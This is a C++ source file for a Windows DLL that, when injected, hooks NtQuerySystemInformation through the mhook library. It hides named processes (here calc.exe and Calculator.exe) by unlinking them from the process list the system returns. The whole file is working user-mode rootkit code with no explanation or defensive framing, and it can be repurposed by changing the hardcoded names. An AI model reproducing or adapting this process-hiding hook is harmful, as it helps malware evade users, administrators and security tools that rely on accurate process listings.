#include "pch.h"
#include <mhook-lib/mhook.h>

//////////////////////////////////////////////////////////////////////////
// Defines and typedefs
// Macros available in kernel mode which are not available in user mode

#define RTL_CONSTANT_STRING(s) \
{ \
    sizeof( s ) - sizeof( (s)[0] ), \
    sizeof( s ), \
    (s) \
}

#ifndef Add2Ptr
#define Add2Ptr(P,I) ((PVOID)((PUCHAR)(P) + (I)))
#endif

//////////////////////////////////////////////////////////////////////////
// Forward declaration of ntdll function

extern "C" NTSYSAPI BOOLEAN RtlEqualUnicodeString(
    PCUNICODE_STRING String1,
    PCUNICODE_STRING String2,
    BOOLEAN          CaseInSensitive
);

//////////////////////////////////////////////////////////////////////////
// Values _SYSTEM_INFORMATION_CLASS enum from <winternl.h>

enum class SystemInformationClass
{
    SystemProcessInformation = 0x5,
    SystemExtendedProcessInformationID = 0x39,
    SystemFullProcessInformationID = 0x94
};

//////////////////////////////////////////////////////////////////////////
// array of process names to hide
static const UNICODE_STRING hiddenProcessNames[] =
{
	RTL_CONSTANT_STRING(L"calc.exe"),
	RTL_CONSTANT_STRING(L"Calculator.exe")
};

//////////////////////////////////////////////////////////////////////////
// Original function

auto OriginalNtQuerySystemInformation = reinterpret_cast<decltype(NtQuerySystemInformation) *>(
    ::GetProcAddress(::GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation"));

//////////////////////////////////////////////////////////////////////////
// Hooked function

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    __in       SYSTEM_INFORMATION_CLASS systemInformationClass,
    __inout    PVOID                    systemInformation,
    __in       ULONG                    systemInformationLength,
    __out_opt  PULONG                   returnLength
    )
{
    NTSTATUS status = OriginalNtQuerySystemInformation(systemInformationClass,
        systemInformation,
        systemInformationLength,
        returnLength);

    if (!NT_SUCCESS(status))
    {
        return status;
    }

    switch (systemInformationClass)
    {
        case SystemInformationClass::SystemProcessInformation:
        case SystemInformationClass::SystemExtendedProcessInformationID:
        case SystemInformationClass::SystemFullProcessInformationID:
		{

			// Loop through the list of processes
            for (PSYSTEM_PROCESS_INFORMATION  pCurrent = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(systemInformation),
                pNext = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(Add2Ptr(pCurrent, pCurrent->NextEntryOffset))
                ;
                pNext != nullptr
                ; 
                pCurrent = pNext,
                pNext = pCurrent->NextEntryOffset ? reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(Add2Ptr(pCurrent, pCurrent->NextEntryOffset)) : nullptr
            )
            {
                if (RtlEqualUnicodeString(&pNext->ImageName, &hiddenProcessNames[0], TRUE)
                    || RtlEqualUnicodeString(&pNext->ImageName, &hiddenProcessNames[1], TRUE)
				)
                {
                    pCurrent->NextEntryOffset =  (0 == pNext->NextEntryOffset) ? 0 : pCurrent->NextEntryOffset + pNext->NextEntryOffset;
                    pNext = pCurrent;
                }
            }
            break;
        }
        default:
        {
            break;
        }
    }

    return status;
}

//////////////////////////////////////////////////////////////////////////
// Entry point

BOOL WINAPI DllMain(
    __in HINSTANCE  hInstance,
    __in DWORD      Reason,
    __in LPVOID     Reserved
    )
{
    switch (Reason)
    {
    case DLL_PROCESS_ATTACH:
        Mhook_SetHook(reinterpret_cast<PVOID*>(&OriginalNtQuerySystemInformation), HookedNtQuerySystemInformation);
        break;

    case DLL_PROCESS_DETACH:
        Mhook_Unhook(reinterpret_cast<PVOID*>(&OriginalNtQuerySystemInformation));
        break;
    }

    return TRUE;
}
